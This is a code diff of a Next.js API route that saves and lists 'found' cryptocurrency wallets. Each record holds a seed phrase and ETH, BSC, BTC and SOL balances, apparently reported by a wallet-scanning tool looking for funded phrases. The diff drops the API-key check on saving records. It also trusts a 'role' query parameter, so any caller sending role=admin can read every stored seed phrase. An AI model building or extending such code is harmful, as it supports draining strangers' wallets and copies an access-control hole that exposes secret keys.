@@ -1,17 +1,40 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { supabaseAdmin } from '@/lib/supabase';
 
-// POST /api/wallets - called by scanner when a wallet with balance is found
-export async function POST(req: NextRequest) {
+// GET /api/wallets - fetch found wallets
+export async function GET(req: NextRequest) {
   try {
-    const apiKey = req.headers.get('x-api-key');
-    if (apiKey !== process.env.SCANNER_API_KEY && process.env.SCANNER_API_KEY) {
-      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
+    const userId = req.nextUrl.searchParams.get('userId') || 'public';
+    const role = req.nextUrl.searchParams.get('role') || 'user';
+
+    let query = supabaseAdmin
+      .from('wallet_results')
+      .select('*')
+      .order('found_at', { ascending: false })
+      .limit(500);
+
+    // Si no es admin, devolver únicamente las wallets encontradas por este usuario
+    if (role !== 'admin') {
+      query = query.eq('user_id', userId);
     }
 
+    const { data, error } = await query;
+    if (error) throw error;
+
+    return NextResponse.json({ data: data || [] });
+  } catch (err: unknown) {
+    const msg = err instanceof Error ? err.message : 'Database error';
+    console.warn('GET /api/wallets warning:', msg);
+    return NextResponse.json({ data: [], warning: 'Error al consultar wallets' });
+  }
+}
+
+// POST /api/wallets - save found wallet
+export async function POST(req: NextRequest) {
+  try {
     const body = await req.json();
     const {
-      phrase,
+      user_id, user_email, phrase,
       eth_address, eth_balance,
       bsc_address, bsc_balance,
       btc_address, btc_balance,
@@ -19,21 +42,18 @@ export async function POST(req: NextRequest) {
     } = body;
 
     if (!phrase) {
-      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
+      return NextResponse.json({ error: 'Missing phrase' }, { status: 400 });
     }
 
-    const insertData: Record<string, unknown> = {
+    const insertData = {
+      user_id: user_id || 'public',
+      user_email: user_email || 'anónimo',
       phrase,
-      eth_address: eth_address || null,
-      eth_balance: eth_balance || 0,
-      sol_address: sol_address || null,
-      sol_balance: sol_balance || 0,
+      eth_address: eth_address || null, eth_balance: eth_balance || 0,
+      bsc_address: bsc_address || eth_address || null, bsc_balance: bsc_balance || 0,
+      btc_address: btc_address || null, btc_balance: btc_balance || 0,
+      sol_address: sol_address || null, sol_balance: sol_balance || 0,
     };
-
-    if (bsc_address !== undefined) insertData.bsc_address = bsc_address;
-    if (bsc_balance !== undefined) insertData.bsc_balance = bsc_balance;
-    if (btc_address !== undefined) insertData.btc_address = btc_address;
-    if (btc_balance !== undefined) insertData.btc_balance = btc_balance;
 
     const { data, error } = await supabaseAdmin
       .from('wallet_results')
@@ -45,27 +65,7 @@ export async function POST(req: NextRequest) {
 
     return NextResponse.json({ success: true, data });
   } catch (err: unknown) {
-    const msg = err instanceof Error ? err.message : 'Database unavailable';
-    console.warn('POST /api/wallets warning:', msg);
-    return NextResponse.json({ error: msg }, { status: 500 });
-  }
-}
-
-// GET /api/wallets - fetch all found wallets
-export async function GET() {
-  try {
-    const { data, error } = await supabaseAdmin
-      .from('wallet_results')
-      .select('*')
-      .order('found_at', { ascending: false })
-      .limit(500);
-
-    if (error) throw error;
-
-    return NextResponse.json({ data: data || [] });
-  } catch (err: unknown) {
     const msg = err instanceof Error ? err.message : 'Database error';
-    console.warn('GET /api/wallets warning:', msg);
-    return NextResponse.json({ data: [], warning: 'Supabase no configurado o inalcanzable' });
+    return NextResponse.json({ error: msg }, { status: 500 });
   }
 }
